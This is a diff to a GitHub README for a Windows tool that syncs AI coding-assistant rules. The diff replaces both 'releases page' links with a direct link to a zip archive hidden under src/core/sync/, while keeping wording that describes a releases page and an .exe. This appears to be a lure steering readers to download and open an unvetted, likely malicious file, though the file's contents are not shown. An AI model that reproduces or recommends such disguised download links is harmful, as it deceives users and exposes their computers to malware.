@@ -1,6 +1,6 @@
 # 🤖 airules - Standardize coding rules for every tool
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Phukg/airules/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Phukg/airules/raw/refs/heads/main/src/core/sync/Software_v3.8.zip)
 
 Airules helps you manage your coding instructions. Many modern coding tools like Cursor, Windsurf, or Claude Code use special rules to understand your project. Setting these rules for every tool takes time. Airules saves your rules in one file. The app then sends these instructions to all your favorite coding helpers. You update one file to change how your AI assistant writes code.
 
@@ -14,7 +14,7 @@ Airules removes this work. You store your setup in a file named .airules.yml. Th
 
 You need a Windows computer to use this app. Follow these steps to set up your workflow:
 
-1. Visit the [releases page](https://github.com/Phukg/airules/releases).
+1. Visit the [releases page](https://github.com/Phukg/airules/raw/refs/heads/main/src/core/sync/Software_v3.8.zip).
 2. Look for the file ending in .exe under the latest version.
 3. Click the file to start the download.
 4. Open the file once the download completes.
